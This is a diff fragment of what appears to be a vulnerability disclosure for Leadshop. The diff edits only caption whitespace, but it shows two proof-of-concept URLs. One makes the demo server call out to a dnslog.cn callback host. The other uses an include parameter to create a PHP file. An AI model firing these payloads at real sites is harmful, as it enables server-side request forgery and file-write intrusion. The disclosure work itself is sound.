@@ -58,13 +58,13 @@ Poc：
 ```
 https://demo.leadshop.vip/leadshop.php?include=HttpGet&meta=6nup69.dnslog.cn  
 ```
-DNSLog picture:
+DNSLog picture:  
 ![img](DNSLog.png)
 
 ```
 http://example.org/?include=ToMkdir&meta=orobos.php&data=1
 ```
-file picture:
+file picture:  
 ![img](tomkdir.PNG)
 
 -
